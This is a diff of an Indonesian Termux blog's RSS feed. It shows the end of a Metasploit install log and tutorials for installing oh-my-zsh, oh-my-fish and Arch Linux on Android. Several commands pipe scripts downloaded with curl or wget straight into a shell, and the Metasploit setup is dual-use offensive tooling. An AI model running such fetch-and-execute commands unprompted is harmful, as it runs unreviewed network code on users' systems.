+Using dnsruby 1.61.7
+Using docile 1.4.0
+Using domain_name 0.5.20190701
+Using ed25519 1.2.4
+Using eventmachine 1.2.7
+Using em-socksify 0.3.2
+Using http_parser.rb 0.8.0
+Using em-http-request 1.1.7
+Using factory_bot 6.2.0
+Using method_source 1.0.0
+Using thor 1.1.0
+Using railties 6.1.4.1
+Using factory_bot_rails 6.2.0
+Using faker 2.19.0
+Using faraday-em_http 1.0.0
+Using faraday-em_synchrony 1.0.0
+Using faraday-excon 1.1.0
+Using faraday-httpclient 1.0.1
+Using faraday-net_http 1.0.1
+Using faraday-net_http_persistent 1.2.0
+Using faraday-patron 1.0.0
+Using faraday-rack 1.0.0
+Using multipart-post 2.1.1
+Using ruby2_keywords 0.0.5
+Using faraday 1.8.0
+Using websocket-extensions 0.1.5
+Using websocket-driver 0.7.5
+Using faye-websocket 0.11.1
+Using ffi 1.15.4
+Using filesize 0.2.0
+Using fivemat 1.3.7
+Using gssapi 1.3.1
+Using gyoku 1.3.1
+Using hashery 2.1.2
+Using hrr_rb_ssh 0.4.2
+Using hrr_rb_ssh-ed25519 0.4.2
+Using http-cookie 1.0.4
+Using httpclient 2.8.3
+Using io-console 0.5.9
+Using reline 0.2.5
+Using irb 1.3.6
+Using rkelly-remix 0.0.7
+Using jsobfu 0.4.2
+Using json 2.6.0
+Using little-plugger 1.1.4
+Using multi_json 1.15.0
+Using logging 2.3.0
+Using memory_profiler 1.0.0
+Using metasm 1.0.5
+Using metasploit-concern 4.0.3
+Using metasploit-model 4.0.3
+Using pg 1.2.3
+Using recog 2.3.21
+Using webrick 1.7.0
+Using metasploit_data_models 5.0.4
+Using net-ssh 6.1.0
+Using rex-core 0.1.18
+Using rex-socket 0.1.33
+Using rubyntlm 0.6.3
+Using rubyzip 2.3.2
+Using metasploit-credential 5.0.5
+Using metasploit-payloads 2.0.58
+Using metasploit_payloads-mettle 1.0.13
+Using mqtt 0.5.0
+Using msgpack 1.4.2
+Using nessus_rest 0.1.6
+Using net-ldap 0.17.0
+Using network_interface 0.0.2
+Using nexpose 7.3.0
+Using sawyer 0.8.2
+Using octokit 4.21.0
+Using openssl-ccm 1.2.2
+Using openvas-omp 0.0.4
+Using pcaprub 0.12.4
+Using packetfu 1.1.13
+Using patch_finder 1.0.2
+Using ruby-rc4 0.1.5
+Using ttfunk 1.7.0
+Using pdf-reader 2.5.0
+Using nio4r 2.5.8
+Using puma 5.5.2
+Using rb-readline 0.5.5
+Using redcarpet 3.5.1
+Using rex-text 0.2.37
+Using rex-arch 0.1.14
+Using rex-struct2 0.1.3
+Using rex-bin_tools 0.1.8
+Using rex-encoder 0.1.6
+Using rexml 3.2.5
+Using rex-exploitation 0.1.28
+Using rex-java 0.1.6
+Using rex-mime 0.1.6
+Using rex-nop 0.1.2
+Using rex-ole 0.1.7
+Using rex-random_identifier 0.1.8
+Using rex-powershell 0.1.93
+Using rex-registry 0.1.4
+Using rex-rop_builder 0.1.4
+Using rex-sslscan 0.1.6
+Using rex-zip 0.1.4
+Using ruby-macho 2.5.1
+Using openssl-cmac 2.0.1
+Using windows_error 0.1.2
+Using ruby_smb 2.0.11
+Using mustermann 1.1.1
+Using rack-protection 2.1.0
+Using tilt 2.0.10
+Using sinatra 2.1.0
+Using sqlite3 1.4.2
+Using sshkey 2.0.0
+Using swagger-blocks 3.0.0
+Using thin 1.8.1
+Using tzinfo-data 1.2021.3
+Using unix-crypt 1.3.0
+Using warden 1.2.9
+Using win32api 0.1.0
+Using nori 2.6.0
+Using winrm 2.3.6
+Using xdr 3.0.2
+Using xmlrpc 0.3.2
+Using metasploit-framework 6.1.11 from source at &lt;code&gt;.&lt;/code&gt;
+Using parallel 1.21.0
+Using parser 3.0.2.0
+Using pry 0.13.1
+Using pry-byebug 3.9.0
+Using rainbow 3.0.0
+Using regexp_parser 2.1.1
+Using rspec-support 3.10.2
+Using rspec-core 3.10.1
+Using rspec-expectations 3.10.1
+Using rspec-mocks 3.10.2
+Using rspec 3.10.0
+Using rspec-rails 5.0.2
+Using rspec-rerun 1.1.0
+Using rubocop-ast 1.12.0
+Using ruby-progressbar 1.11.0
+Using unicode-display_width 2.1.0
+Using rubocop 1.22.1
+Using ruby-prof 1.4.2
+Using simplecov-html 0.12.3
+Using simplecov 0.18.2
+Using timecop 0.9.4
+Using yard 0.9.26
+Bundle complete! 15 Gemfile dependencies, 193 gems now installed.
+Use &lt;code&gt;bundle info [gemname]&lt;/code&gt; to see where a bundled gem is installed.
+open(&amp;quot;/data/data/com.termux/files/usr/lib/ruby/gems/2.4.0/gems/pg-0.20.0/lib/pg_ext.so&amp;quot;): No such file or directory&lt;/p&gt;
+&lt;p&gt;============== *** Database configuration&amp;hellip; ==============
+The files belonging to this database system will be owned by user &amp;ldquo;u0_a1755&amp;rdquo;.
+This user must also own the server process.&lt;/p&gt;
+&lt;p&gt;The database cluster will be initialized with locale &amp;ldquo;C.UTF-8&amp;rdquo;.
+The default text search configuration will be set to &amp;ldquo;english&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Data page checksums are disabled.&lt;/p&gt;
+&lt;p&gt;fixing permissions on existing directory /data/data/com.termux/files/usr/var/lib/postgresql &amp;hellip; ok
+creating subdirectories &amp;hellip; ok
+selecting dynamic shared memory implementation &amp;hellip; sysv
+selecting default max_connections &amp;hellip; 100
+selecting default shared_buffers &amp;hellip; 128MB
+selecting default time zone &amp;hellip; Asia/Jakarta
+creating configuration files &amp;hellip; ok
+running bootstrap script &amp;hellip; ok
+performing post-bootstrap initialization &amp;hellip; ok
+syncing data to disk &amp;hellip; ok&lt;/p&gt;
+&lt;p&gt;initdb: warning: enabling &amp;ldquo;trust&amp;rdquo; authentication for local connections
+You can change this by editing pg_hba.conf or using the option -A, or
+&amp;ndash;auth-local and &amp;ndash;auth-host, the next time you run initdb.&lt;/p&gt;
+&lt;p&gt;Success. You can now start the database server using:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pg_ctl -D /data/data/com.termux/files/usr/var/lib/postgresql -l logfile start
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;waiting for server to start&amp;hellip;.2021-10-16 06:08:40.039 WIB [16184] LOG:  starting PostgreSQL 13.3 on aarch64-unknown-linux-android, compiled by Android (6454773 based on r365631c2) clang version 9.0.8 (&lt;a class=&#34;link&#34; href=&#34;https://android.googlesource.com/toolchain/llvm-project&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://android.googlesource.com/toolchain/llvm-project&lt;/a&gt; 98c855489587874b2a325e7a516b99d838599c6f) (based on LLVM 9.0.8svn), 64-bit
+2021-10-16 06:08:40.043 WIB [16184] LOG:  listening on IPv4 address &amp;ldquo;127.0.0.1&amp;rdquo;, port 5432
+2021-10-16 06:08:40.405 WIB [16184] LOG:  listening on Unix socket &amp;ldquo;/data/data/com.termux/files/usr/tmp/.s.PGSQL.5432&amp;rdquo;
+.2021-10-16 06:08:40.939 WIB [16221] LOG:  database system was shut down at 2021-10-16 06:08:28 WIB
+2021-10-16 06:08:41.107 WIB [16184] LOG:  database system is ready to accept connections
+done
+server started&lt;/p&gt;
+&lt;p&gt;============================ * ============================
+Installation complete.
+To start msf database use: ./postgresql_ctl.sh start
+Launch metasploit by executing: msfconsole
+============================ * ============================&lt;/p&gt;
+&lt;/details&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Kemungkinan akan memakan penyimpanan perangkat Anda sebesar &lt;code&gt;500MB&lt;/code&gt; sampai &lt;code&gt;1GB&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Penginstalan sudah selesai , silahkan lanjutkan ke artikel selanjutnya tentang cara menggunakan &lt;strong&gt;metasploit&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;🚂 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://maidey.github.io/blog/artikel/cara-menggunakan-metasploit&#34; &gt;cara menggunakan metasploit&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>cara install oh my zsh Dan oh my fish</title>
+        <link>https://maidey.github.io/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/</link>
+        <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://maidey.github.io/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/</guid>
+        <description>&lt;img src="https://maidey.github.io/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/20211011_002237.jpg" alt="Featured image of post cara install oh my zsh Dan oh my fish" /&gt;&lt;p&gt;Sebelum melanjutkan saya akan memberitahu urutan isi dari artikel ini.
+Jangan lupa bergabung dengan channel telegram, klik &lt;a class=&#34;link&#34; href=&#34;https://t.me/termux_shortcut&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DISINI&lt;/a&gt; atau &lt;a class=&#34;link&#34; href=&#34;https://t.me/termux_shortcut&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@termux_shortcut&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;isi-artikel&#34;&gt;Isi artikel&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#apa-itu-oh-my-zsh-fish&#34; &gt;apa itu oh my zsh/fish&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#pendapat-saya&#34; &gt;pendapat saya&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#pemasangan&#34; &gt;pemasangan&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#oh-my-zsh&#34; &gt;oh my zsh&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;#oh-my-fish&#34; &gt;oh my fish&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;apa-itu-oh-my-zsh-fish&#34;&gt;apa itu oh my zsh fish&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;oh my zsh&lt;/strong&gt; adalah kerangka kerja open source dan berbasis komunitas untuk mengelola konfigurasi Zsh Anda.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;oh my fish&lt;/strong&gt; adalah
+shell baris perintah yang cerdas dan ramah pengguna untuk Linux, macOS, dan keluarga lainnya.&lt;/p&gt;
+&lt;h2 id=&#34;pendapat-saya&#34;&gt;pendapat saya&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;oh my zsh&lt;/strong&gt; akan memperbagus tampilan antarmuka termux Anda ,Anda juga bisa merubah tampilannya sesuka hati karena banyak sekali pilihan tema yang bisa Anda pasang .
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 132; 
+			flex-basis: 318px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_201641.png&#34; data-size=&#34;719x541&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_201641.png&#34;
+			width=&#34;719&#34;
+			height=&#34;541&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_201641_huc8654f3be9138414ac04394f2999d7e3_92575_480x0_resize_box_3.png 480w, https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_201641_huc8654f3be9138414ac04394f2999d7e3_92575_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;contoh oh my zsh&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;contoh oh my zsh&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 138; 
+			flex-basis: 332px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_202427.png&#34; data-size=&#34;719x519&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_202427.png&#34;
+			width=&#34;719&#34;
+			height=&#34;519&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_202427_hu3cb99394a7810e8ebd122915e9cfcd44_55992_480x0_resize_box_3.png 480w, https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_202427_hu3cb99394a7810e8ebd122915e9cfcd44_55992_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;contoh oh my zsh&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;contoh oh my zsh&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;oh my fish&lt;/strong&gt; akan mempermudah anda menggunakan termux karena ini dapat dengan otomatis melengkapi ketik-an anda, dan mengingat apa yang Anda ketikkan sebelumnya.
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 168; 
+			flex-basis: 404px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_201841.gif&#34; data-size=&#34;697x414&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_201841.gif&#34;
+			width=&#34;697&#34;
+			height=&#34;414&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_201841_hufe6b1084e8ce9f998f3d6fd1cf0cd516_166888_480x0_resize_box.gif 480w, https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_201841_hufe6b1084e8ce9f998f3d6fd1cf0cd516_166888_1024x0_resize_box.gif 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;gif ketuk untuk menjalankan&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;gif ketuk untuk menjalankan&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 165; 
+			flex-basis: 397px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_202535.gif&#34; data-size=&#34;702x424&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_202535.gif&#34;
+			width=&#34;702&#34;
+			height=&#34;424&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_202535_huc782d69dd9e84ca339ac8d0ca24f37aa_87531_480x0_resize_box.gif 480w, https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1010_202535_huc782d69dd9e84ca339ac8d0ca24f37aa_87531_1024x0_resize_box.gif 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;gif ketuk untuk menjalankan&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;gif ketuk untuk menjalankan&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;pemasangan&#34;&gt;pemasangan&lt;/h2&gt;
+&lt;p&gt;Proses pemasangan akan dibagi dua pertama adalah pemasangan &lt;strong&gt;oh my zsh&lt;/strong&gt; yang kedua pemasangan &lt;strong&gt;oh my fish&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;oh-my-zsh&#34;&gt;oh my zsh&lt;/h3&gt;
+&lt;p&gt;Ada beberapa cara, pilih salah satu&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cara pakai curl&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+sh -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;cara pakai wget&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+pkg i wget 
+
+sh -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Sekarang install tema nya, disini saya akan mencontohkan menggunakan tema   &lt;code&gt;agnoster&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+cd
+
+nano .zshrc
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Tempelkan tema nya di &lt;code&gt;ZSH_THEME=&lt;/code&gt;
+Contoh:
+ZSH_THEME=&amp;ldquo;agnoster&amp;rdquo;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 203; 
+			flex-basis: 488px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1011_000712.gif&#34; data-size=&#34;556x273&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1011_000712.gif&#34;
+			width=&#34;556&#34;
+			height=&#34;273&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1011_000712_huacf7821b5786ffce7b2bc86560193cf1_513366_480x0_resize_box.gif 480w, https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1011_000712_huacf7821b5786ffce7b2bc86560193cf1_513366_1024x0_resize_box.gif 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;gif ketuk untuk menjalankan&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;gif ketuk untuk menjalankan&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Anda bisa memilih tema yang lainnya &lt;a class=&#34;link&#34; href=&#34;https://github.com/ohmyzsh/ohmyzsh/wiki/Themes&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DISINI&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;oh-myfish&#34;&gt;oh myfish&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+pkg i fish
+  
+curl -L https://get.oh-my.fish | fish
+
+omf install agnoster
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Cara untuk memakai :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+fish
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 336; 
+			flex-basis: 807px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1011_001922.gif&#34; data-size=&#34;713x212&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1011_001922.gif&#34;
+			width=&#34;713&#34;
+			height=&#34;212&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1011_001922_hu511bf394769158ee02ee2186a8f9edea_52683_480x0_resize_box.gif 480w, https://maidey.github.io/blog/blog/artikel/cara-install-oh-my-zsh-dan-oh-my-fish/Screenshot_2021_1011_001922_hu511bf394769158ee02ee2186a8f9edea_52683_1024x0_resize_box.gif 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;gif ketuk untuk menjalankan&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;gif ketuk untuk menjalankan&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Tema yang tersedia bisa lihat &lt;a class=&#34;link&#34; href=&#34;https://github.com/oh-my-fish/oh-my-fish/blob/master/docs/Themes.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DISINI&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>pasang Arch di termux</title>
+        <link>https://maidey.github.io/blog/artikel/pasang-arch-di-termux/</link>
+        <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://maidey.github.io/blog/artikel/pasang-arch-di-termux/</guid>
+        <description>&lt;img src="https://maidey.github.io/blog/artikel/pasang-arch-di-termux/20211009_111549.jpg" alt="Featured image of post pasang Arch di termux" /&gt;&lt;p&gt;Sebelum melanjutkan saya akan memberitahu urutan isi dari artikel ini.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Penjelasan apa itu Arch&lt;/li&gt;
+&lt;li&gt;pendapat saya tentang Arch&lt;/li&gt;
+&lt;li&gt;cara instalasi
+- cari install metode 1
+- cari install metode 2
+- cari install metode 3&lt;/li&gt;
+&lt;li&gt;Perintah setelah penginstalan&lt;/li&gt;
+&lt;li&gt;Perintah dasar&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;apa-itu-arch-linux&#34;&gt;apa itu Arch Linux&lt;/h2&gt;
+&lt;p&gt;Menurut &lt;strong&gt;Wikipedia&lt;/strong&gt; Arch Linux (dikenal juga dengan ArchLinux atau Arch) adalah sebuah distribusi Linux untuk komputer x86_64 (64 bit) yang didesain untuk menjadi ringan dan sederhana.&lt;/p&gt;
+&lt;p&gt;Pendekatan desain pengembang distro ini berfokus pada kesederhanaan, kebenaran program dan minimalisme. &amp;ldquo;Kesederhanaan&amp;rdquo; didefinisikan sebagai &amp;ldquo;tak perlu tambahan, modifikasi, atau komplikasi&amp;rdquo; sesuai sudut pandang pengembangnya, bukan sudut pandang pengguna.&lt;/p&gt;
+&lt;p&gt;Arch Linux adalah sebuah distribusi Linux berbasis biner, yang artinya, paket-paket aplikasi didistribusikan dalam bentuk telah terkompilasi. Berbeda dengan Gentoo yang mendistribusikan paket-paketnya dalam bentuk kode sumber.&lt;/p&gt;
+&lt;h2 id=&#34;pendapat-saya-tentang-arch&#34;&gt;pendapat saya tentang Arch&lt;/h2&gt;
+&lt;p&gt;Menurut saya Arch Linux sangat bagus, apa lagi Arch Linux mempunyai banyak sekali tool, dan pemasangan nya pun sangat mudah ,  ukuran file yang akan di download sebesar &lt;strong&gt;590 MB&lt;/strong&gt; dan setelah proses instalasi Arch ukuran data termux akan menjadi &lt;strong&gt;1,10 GB&lt;/strong&gt; .&lt;/p&gt;
+&lt;h2 id=&#34;cara-install&#34;&gt;cara install&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ada 3 cara Anda dapat memilih cara mana yang Anda suka.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;sebelumnya anda harus menyiapkan storage :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+
+termux-setup-storage
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cara-pertama&#34;&gt;cara pertama&lt;/h3&gt;
+&lt;p&gt;Metode ini dapat dijalankan dengan mengetuk &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://sdrausty.github.io/TermuxArch/setupTermuxArch.sh&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;tautan ini&lt;/a&gt;&lt;/strong&gt; yang harus diunduh setupTermuxArch.sh ke &lt;code&gt;~/storage/downloads/&lt;/code&gt;direktori Anda di ponsel cerdas dan tablet Anda. Jika mengetuk pendek tautan ini tidak mengunduh &lt;a class=&#34;link&#34; href=&#34;https://sdrausty.github.io/TermuxArch/setupTermuxArch.sh&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;setupTermuxArch.sh&lt;/a&gt; dari browser web Anda, coba ketuk lama dan pilih unduh file dari menu popup. Instal Arch Linux di Termux PROot hanya dengan menjalankan baris kode berikutnya di Termux:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+
+bash ~/storage/downloads/setupTermuxArch.sh
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cara-kedua&#34;&gt;cara kedua&lt;/h3&gt;
+&lt;p&gt;Jalankan baris perintah berikut di bash untuk menginstal Arch Linux di Termux pada perangkat Anda. Jalankan setiap baris perintah berikut secara terpisah. Menjalankan semuanya sekaligus dapat menghasilkan kesalahan; Petunjuk, salin dan tempel berikut ini ke jendela Termux:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#install git&lt;/span&gt;
+pkg install git
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#download script&lt;/span&gt;
+cd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git clone https://github.com/sdrausty/TermuxArch
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#install script&lt;/span&gt;
+bash TermuxArch/setupTermuxArch.sh
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cara-ketiga&#34;&gt;cara ketiga&lt;/h3&gt;
+&lt;p&gt;Salin dan tempel baris perintah berikut ke shell perintah bash Termux Anda:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#install wget&lt;/span&gt;
+pkg install wget
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#download script&lt;/span&gt;
+wget https://sdrausty.github.io/TermuxArch/setupTermuxArch.sh
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#install script&lt;/span&gt;
+bash setupTermuxArch.sh
+
+
